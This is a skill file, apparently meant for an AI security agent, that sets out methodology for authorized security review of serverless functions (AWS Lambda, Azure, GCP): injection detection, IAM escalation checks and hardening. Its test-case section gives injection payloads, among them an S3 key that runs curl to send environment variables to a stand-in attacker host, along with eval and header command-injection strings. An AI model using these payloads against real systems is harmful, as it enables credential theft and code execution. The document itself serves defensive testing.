---
name: serverless
description: "Canonical serverless capability consolidating 3 sub-skills: detecting-serverless-function-injection, performing-serverless-function-security-review, securing-serverless-functions. Use when hunting or validating serverless-related vulnerabilities."
sources: consolidated
---

# SERVERLESS — Canonical Capability

## 1. Identity and purpose

This is the single primary capability entry point for the `serverless` security domain. It consolidates 3 previously separate sub-skills — `detecting-serverless-function-injection`, `performing-serverless-function-security-review`, and `securing-serverless-functions` — into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Detect code injection in serverless functions (AWS Lambda, Azure Functions, GCP Cloud Functions) via event source poisoning, malicious layers, runtime command execution, and IAM privilege escalation.
- Perform security reviews of serverless functions across providers: overprivileged execution roles, insecure environment variables, injection, missing runtime protections.
- Harden serverless platforms: least-privilege IAM, secrets management, dependency scanning, input validation, function URL auth, runtime monitoring.

## 2. Scope

In scope:
- AWS Lambda, Azure Functions, Google Cloud Functions (and related triggers: API Gateway, S3, SQS, DynamoDB Streams, CloudWatch/EventBridge).
- Static analysis of function code for injection sinks (eval, exec, os.system, child_process.exec, subprocess, pickle, yaml.load, template injection).
- Event source poisoning through S3 object keys, SQS bodies, API Gateway headers/params, DynamoDB stream records.
- Malicious Lambda layer injection and layer hijacking.
- IAM privilege escalation via UpdateFunctionCode + PassRole.
- Execution role permissions, environment variable secrets, deprecated runtimes, public function URLs/resource policies.
- Runtime monitoring, GuardDuty Lambda protection, structured logging.

Out of scope (hand off):
- Container/VM security assessments -> container escape / cloud capabilities.
- API Gateway configuration beyond function triggers -> implementing-cloud-waf-rules / api capabilities.
- Real-time threat detection platform engineering -> cloud monitoring capabilities.
- Load testing or DoS against serverless functions (not authorized by this capability).

## 3. Invocation and routing

Use this capability when:
- Auditing Lambda/Cloud Functions for code injection or event poisoning.
- Investigating incidents of unauthorized function modification or credential exfiltration.
- Reviewing serverless functions before production deployment (roles, secrets, runtimes, access).
- Hardening serverless deployments in a DevSecOps pipeline.

Routing notes:
- Start with `references/detecting-serverless-function-injection.md` for injection detection methodology.
- Use `references/performing-serverless-function-security-review.md` for the cross-provider security review workflow.
- Use `references/securing-serverless-functions.md` for hardening and remediation.
- Use `references/*-api-reference.md` for agent/API and boto3 tooling details.
- Injection deep-dives route to detecting reference (Steps 2-5); review findings route to performing reference; remediation routes to securing reference.

## 4. Inputs and outputs

Inputs:
- Cloud provider credentials with read (and where authorized, modify) permissions for Lambda/Functions, IAM, CloudTrail, CloudWatch, EventBridge.
- Function source code / deployment packages, or access to download them.
- Target account, region, and scope authorization.
- Optional: CI/CD artifacts, SAM/Serverless Framework projects, Checkov/Prowler/Semgrep/Bandit.

Outputs:
- Findings report with severity, function, runtime, sink/source, attack vector, PoC, remediation.
- Permission/secret audit tables per function.
- Detection rules (EventBridge, CloudWatch Logs Insights) and Config rules.
- Hardening recommendations and IaC/policy snippets.
- Refuted candidates with disproof rationale.

## 5. Preconditions and authorization

- Confirm written authorization and scope before testing; include accounts, regions, and test functions.
- Use only test/non-production functions and data unless explicitly authorized.
- Do not modify IAM policies in shared accounts without change management approval.
- Do not test production functions processing live customer data without explicit authorization.
- Preserve malicious code as forensic evidence before remediation.
- Document out-of-scope vectors and hand off rather than claim.

## 6. Reconnaissance

Recon steps:
1. Enumerate all serverless functions across providers with runtime, memory, timeout, role, VPC, layers.
2. Map event source triggers (API Gateway, S3, SQS, DynamoDB Streams, EventBridge) — each is an injection entry point.
3. Identify API Gateway routes passing HTTP data into Lambda event objects; identify S3 bucket notifications.
4. Catalog function environment variables; flag sensitive patterns (password, secret, key, token, AKIA...).
5. Identify overprivileged execution roles (wildcard actions/resources, admin policies).
6. Identify deprecated runtimes (python3.7, nodejs14.x, dotnetcore3.1).
7. Check for unauthenticated function URLs and public resource-based policies (Principal: *).
8. Audit attached layers (especially from external accounts).

See `references/detecting-serverless-function-injection.md` (Step 1) and `references/performing-serverless-function-security-review.md` (Steps 1-4).

## 7. Detection methodology

Core detection flow:
1. Surface mapping: enumerate functions, triggers, roles, env vars, layers.
2. Static analysis for injection sinks: download deployment packages; run Semgrep/Bandit; grep for eval/exec/os.system/subprocess/child_process/pickle/yaml.load/template rendering; trace event data into sinks.
3. Event source poisoning: test S3 keys, SQS bodies, API Gateway headers/params, DynamoDB records for injection payloads.
4. Layer injection: audit layer attachments, CloudTrail layer changes, inspect layer contents for suspicious imports (urllib, requests, socket, base64, subprocess).
5. IAM escalation: detect UpdateFunctionCode/UpdateFunctionConfiguration/PassRole; analyze execution role permissions; detect credential exfiltration via CloudTrail.
6. Security review: roles, secrets, triggers, code, automated scanning (Checkov, Prowler).
7. Runtime prevention: input validation, least privilege, SCPs, structured logging, GuardDuty.

Injection sinks (Python): eval, exec, os.system, subprocess.call(shell=True), os.popen, pickle.loads, yaml.load (unsafe), jinja2.Template with user input.
Injection sinks (Node.js): eval, new Function, child_process.exec/execSync, vm.runInNewContext, require('child_process').exec.

## 8. Technique selection

Select techniques by observed surface:
- Static sink found -> Semgrep/Bandit + manual taint analysis from event source to sink.
- Event-triggered function with unsanitized event data -> event source poisoning PoC (S3 key, SQS body, header, DynamoDB record).
- Layers present (especially external account) -> download and inspect layer; test layer hijacking via module path override.
- Overprivileged role + UpdateFunctionCode permission -> IAM escalation path documentation and SCP recommendation.
- Secrets in env vars -> migrate to Secrets Manager; mask and rotate.
- Public function URL / resource policy -> auth requirement and remediation.
- Deprecated runtime -> upgrade and rescan.
- Automated compliance -> Checkov + Prowler Lambda checks.

See `references/detecting-serverless-function-injection.md` (Steps 2-6) and `references/securing-serverless-functions.md` (Steps 1-6).

## 9. Execution steps

1. Establish scope and credentials; enumerate functions and triggers.
2. Download function code; run static analysis (Semgrep, Bandit, custom grep).
3. Test event source poisoning vectors per trigger type.
4. Audit Lambda layers and CloudTrail for unauthorized changes.
5. Analyze IAM escalation paths and credential exfiltration indicators.
6. Perform cross-provider security review (roles, env vars, triggers, code, automated scans).
7. Deploy runtime prevention controls (validation, least privilege, SCPs, logging, GuardDuty).
8. Validate findings with clean reproduction; mark refuted if proof fails.
9. Produce report with findings, detection rules, and remediation.

## 10. Tool usage

- AWS CLI v2, Azure CLI, gcloud CLI.
- Python 3.9+ with boto3, bandit, semgrep, jsonschema.
- Semgrep (serverless/OWASP/command-injection/python-security rules).
- Bandit (B102, B301, B307, B602-B607).
- Checkov (serverless framework), Prowler (Lambda checks).
- Trivy (dependency/container scanning), Snyk, npm audit, pip-audit.
- CloudTrail, CloudWatch Logs Insights, GuardDuty, EventBridge.
- AWS Lambda Powertools for structured logging.
- Agent scripts: `detecting-serverless-function-injection/scripts/agent.py`, `performing-serverless-function-security-review/scripts/agent.py`, `securing-serverless-functions/scripts/agent.py`.

See `references/*-api-reference.md` for agent/API details.

## 11. Payloads and test cases

Representative test cases (adapt to target):
- S3 key injection: object key `; curl http://attacker.com/exfil?data=$(env)` against `os.system(f"aws s3 cp s3://{bucket}/{key} ...")`.
- SQS body injection: message `{"formula": "__import__('os').system('id')"}` against `eval(message['formula'])`.
- API Gateway header injection: `User-Agent: $(id)` against `subprocess.run(f"echo {user_agent} ...", shell=True)`.
- DynamoDB stream injection: record value containing `exec(...)` against `exec(config)`.
- Semgrep: `semgrep --config p/owasp-top-ten --config p/command-injection --config p/python-security function_code/`.
- Bandit: `bandit -r function_code/ -t B102,B301,B307,B602,B603,B604,B605,B606,B607`.
- CloudTrail: lookup-events for UpdateFunctionCode20150331v2, UpdateFunctionConfiguration, CreateFunction.
- CloudWatch Logs Insights: filter messages matching eval/exec/os.system/child_process/subprocess/import os with errors/tracebacks.
- Layer inspection: `grep -rn "urllib\|requests\|http\|socket\|exfil\|base64\|subprocess" layer_contents/`.
- Env var scan: regex for password/secret/key/token/credential/aws access/db url/AKIA[0-9A-Z]{16}.
- Checkov: `checkov -d ./serverless-project/ --framework serverless`.
- Prowler: lambda_function_no_secrets_in_variables, lambda_function_url_auth_type, lambda_function_using_supported_runtimes, lambda_function_not_publicly_accessible.
- Function URL auth: `aws lambda get-function-url-config ... --query AuthType` must be `AWS_IAM`, not `NONE`.

## 12. Evidence

Each finding must include:
- Exact function name, runtime, account/region.
- Source code location (file:line) for sinks; event source and field.
- Attack vector and payload.
- Request/response or tool proof (Semgrep/Bandit output, CloudTrail event, CloudWatch log).
- Impact assessment (credential exfiltration, data access, privilege escalation).
- Reproduction steps.
- For review findings: role policy, env var name (masked), runtime, URL auth type.
- For refuted candidates: disproof rationale.

## 13. Reproduction and validation

- Reproduce injection with a controlled event payload in a non-production function.
- Validate that the sink actually executes (not just that the pattern exists).
- Confirm CloudTrail/Logs evidence corresponds to the test.
- For IAM escalation: confirm UpdateFunctionCode + PassRole permissions and role permissions; demonstrate credential access only in authorized scope.
- For review: re-run automated scans after remediation to confirm closure.
- Mark as refuted if any proof requirement fails.

## 14. False-positive rejection

Reject or downgrade when:
- Injection sink exists but event data is validated/sanitized before reaching it.
- Pattern match is in dead code or test code not deployed.
- Layer is from a trusted, pinned version with known provenance.
- Role has wildcard in name but scoped resource restricts impact (verify actual permissions).
- Env var name matches sensitive pattern but value is a non-secret identifier (verify value).
- Public function URL is intended and protected by other controls (verify AuthType and policy).
- Deprecated runtime is not actually in use or is mitigated by other controls.

## 15. Impact

Impact guidance:
- Critical: RCE via injection in production function with sensitive data/privileged role; IAM escalation to admin; credential exfiltration.
- High: secrets in env vars; public function with sensitive operations; unauthorized external layer; overprivileged role.
- Medium: deprecated runtime with known CVEs; missing input validation on non-sensitive paths; excessive permissions.
- Low/Informational: missing structured logging; non-sensitive config issues.

Always tie impact to specific data/permissions reachable; avoid severity inflation from pattern presence alone.

## 16. Reporting

Report template:
- Summary: account, region, functions analyzed/reviewed, date.
- Critical/High/Medium/Low findings with IDs (SRVL-xxx / SLS-xxx / FINDING-xxx).
- Per finding: function, runtime, sink/source or role/env/URL, attack vector, PoC, remediation.
- Detection rules deployed.
- Dependency vulnerabilities (CVE, package, affected functions).
- Summary metrics: functions with least privilege, secrets manager, input validation, deprecated runtimes, public access, wildcard permissions.
- Remediation plan and preventive controls (SCP, EventBridge, Config rules).

See `references/performing-serverless-function-security-review.md` (Output Format) and `references/securing-serverless-functions.md` (Output Format).

## 17. Failure modes

- No source code access -> rely on config/role/trigger review and CloudTrail; document limitation.
- Function behind VPC/privatelink -> adjust network access; document.
- Automated scan false positives -> manually verify each; document refutations.
- Insufficient permissions -> request read-only access; cannot claim findings without evidence.
- Multi-provider scope -> handle each provider separately; note tooling gaps.
- Layer contents unavailable -> flag as unverified risk.

## 18. References

All 3 sub-skill references (plus mirrored api-references) are preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/detecting-serverless-function-injection.md` | `detecting-serverless-function-injection` | Injection detection methodology |
| `references/detecting-serverless-function-injection-api-reference.md` | `detecting-serverless-function-injection` | Agent/API tooling details |
| `references/performing-serverless-function-security-review.md` | `performing-serverless-function-security-review` | Security review workflow |
| `references/performing-serverless-function-security-review-api-reference.md` | `performing-serverless-function-security-review` | Agent/API tooling details |
| `references/securing-serverless-functions.md` | `securing-serverless-functions` | Hardening and remediation |
| `references/securing-serverless-functions-api-reference.md` | `securing-serverless-functions` | API/boto3 tooling details |

Original sub-skills remain intact under `detecting-serverless-function-injection/`, `performing-serverless-function-security-review/`, and `securing-serverless-functions/` (including nested api-reference.md and scripts/agent.py).

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_serverless_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: deliberately vulnerable Lambda functions, OWASP ServerlessGoat, cloud provider security labs.
- Mastery criteria: independently discover, validate (real injection or documented escalation path), and report a serverless finding with full reproduction and impact, correctly refuting pattern-only candidates.

---

Original sub-skills remain intact for reversibility. See `migration_map.json`.


## Knowledge sources

- WKS bug classes: none mapped
- Domain knowledge: none mapped
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
